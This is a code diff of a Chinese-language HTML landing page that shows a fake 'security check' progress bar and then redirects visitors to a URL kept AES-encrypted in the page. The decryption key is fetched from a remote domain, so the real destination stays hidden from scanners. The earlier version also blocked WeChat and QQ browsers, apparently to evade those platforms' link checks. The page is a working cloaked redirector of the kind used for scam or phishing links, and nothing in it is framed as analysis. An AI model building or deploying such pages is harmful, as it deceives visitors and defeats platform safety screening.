@@ -1,83 +1,132 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>加载中…</title>
-<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-<style>
-  body{margin:0;font-family:"PingFang SC","Microsoft YaHei",sans-serif;background:#f7f9fc;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
-  .hidden{display:none;}                        /* ← 修复*/
-  .panel{width:90%;max-width:420px;background:#fff;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,.08);padding:40px 30px}
-  h1{font-size:20px;margin-bottom:18px;color:#222}
-  .desc{font-size:14px;color:#666;margin-bottom:26px}
-  #startBtn{padding:12px 32px;font-size:16px;border:none;border-radius:6px;background:#1464ff;color:#fff;cursor:pointer}
-  #startBtn:hover{background:#0f54d9}
-  .bar-box{width:100%;height:12px;background:#e5e9f2;border-radius:6px;overflow:hidden;margin-top:20px;display:none}
-  .bar-inner{height:100%;width:0;background:#21c463;transition:width .2s}
-  .hint{font-size:13px;color:#888;margin-top:14px;display:none}
-  .lock{font-size:64px;color:#ff5252;margin-bottom:18px}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>加载中...</title>
+  <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      background: #f4faf7;
+      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
+      display: flex; flex-direction: column;
+      justify-content: center; align-items: center;
+      height: 100vh;
+      text-align: center;
+      color: #333;
+    }
+    .panel {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
+      padding: 40px 30px;
+      max-width: 420px;
+      width: 90%;
+    }
+    .shield {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 20px;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    .shield svg {
+      width: 100%; height: 100%;
+      fill: #4caf50;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.2); opacity: 0.8; }
+    }
+    .progress {
+      width: 100%;
+      height: 12px;
+      background: #e2e8f0;
+      border-radius: 6px;
+      margin: 10px 0 10px;
+      overflow: hidden;
+    }
+    .bar {
+      height: 100%;
+      width: 0;
+      background: #4caf50;
+      transition: width 0.2s;
+    }
+    .desc {
+      font-size: 14px;
+      color: #666;
+    }
+    #btn {
+      display: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      background: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #btn:hover {
+      background: #388e3c;
+    }
+    #progress-text {
+      font-size: 14px;
+      margin-top: 8px;
+      color: #444;
+    }
+  </style>
 </head>
 <body>
 
-<!-- 提示-->
-<div id="block" class="panel hidden">
-  <div class="lock">🔒</div>
-  <h1>请使用手机浏览器打开</h1>
-  <div class="desc">检测到当前环境不安全，无法访问</div>
-</div>
-
-<!-- 正常检测界面 -->
-<div id="main" class="panel hidden">
-  <h1>安全检测</h1>
-  <div class="desc">为保障访问安全，请点击开始进行环境检测</div>
-  <button id="startBtn" onclick="beginCheck()">开始检测</button>
-  <div class="bar-box" id="barBox">
-    <div class="bar-inner" id="barInner"></div>
+<div class="panel">
+  <div class="shield">
+    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
   </div>
-  <div class="hint" id="hintTxt">正在检测环境，请稍候…</div>
+  <h2>正在进行安全检测</h2>
+  <div class="desc" id="text">环境分析中，请稍候...</div>
+  <div class="progress"><div class="bar" id="bar"></div></div>
+  <div id="progress-text">检测进度：0%</div>
+  <button id="btn" onclick="jump()">✅ 安全 · 点击进入</button>
 </div>
 
 <script>
-/* ---------- 1. 配置 ---------- */
-const KEY_API      = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";    // ← 短配置
-const encryptedStr = "U2FsdGVkX192A/lRyN+7xSW3daQeJKRMCfQka+RoY/j7WtxgrEOyliyV8oStPAwum2oyA0qX9tUHQ6UnBpButg=="; // ← 长配置
-const CHECK_MS     = 3000;                                      // ← 检测总时长 ms
+  const encrypted = "U2FsdGVkX192A/lRyN+7xSW3daQeJKRMCfQka+RoY/j7WtxgrEOyliyV8oStPAwum2oyA0qX9tUHQ6UnBpButg==";
+  const keyURL = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
+  const duration = 3000; // 检测时长，毫秒
 
-/* ---------- 2. 提示---------- */
-const isWxOrQq = /micromessenger|qq\//i.test(navigator.userAgent);
-document.getElementById(isWxOrQq ? "block" : "main").classList.remove("hidden");
+  const bar = document.getElementById("bar");
+  const text = document.getElementById("text");
+  const btn = document.getElementById("btn");
+  const percentTxt = document.getElementById("progress-text");
 
-/* ---------- 3. 安全检测---------- */
-function beginCheck(){
-  document.getElementById("startBtn").style.display="none";
-  const barBox=document.getElementById("barBox");
-  const barInner=document.getElementById("barInner");
-  const hint=document.getElementById("hintTxt");
-  barBox.style.display="block"; hint.style.display="block";
-
-  const start=Date.now();
-  const timer=setInterval(()=>{
-    const pct=Math.min(100,(Date.now()-start)/CHECK_MS*100);
-    barInner.style.width=pct+"%";
-    if(pct>=100){
+  let start = Date.now();
+  const timer = setInterval(() => {
+    const percent = Math.min(100, ((Date.now() - start) / duration) * 100);
+    const rounded = Math.floor(percent);
+    bar.style.width = rounded + "%";
+    percentTxt.innerText = "检测进度：" + rounded + "%";
+    if (percent >= 100) {
       clearInterval(timer);
-      hint.innerText="检测完成，正在进入…";
-      fetchKeyAndJump();
+      text.innerText = "检测完成，请点击按钮进入页面";
+      btn.style.display = "inline-block";
     }
-  },60);
-}
+  }, 50);
 
-/* ---------- 4. 逻辑---------- */
-async function fetchKeyAndJump(){
-  try{
-    const key=await fetch(KEY_API+"?t="+Date.now()).then(r=>r.text());
-    const url=CryptoJS.AES.decrypt(encryptedStr,key).toString(CryptoJS.enc.Utf8);
-    if(url.startsWith("http")) location.href=url;
-    else alert("打开失败，请稍后再试");
-  }catch(e){alert("网络异常，请检查连接");}
-}
+  async function jump() {
+    try {
+      const key = await fetch(keyURL + "?t=" + Date.now()).then(res => res.text());
+      const url = CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
+      if (url && url.startsWith("http")) {
+        location.href = url;
+      } else {
+        alert("打开失败，请稍后再试");
+      }
+    } catch (e) {
+      alert("网络异常，请检查连接");
+    }
+  }
 </script>
+
 </body>
 </html>
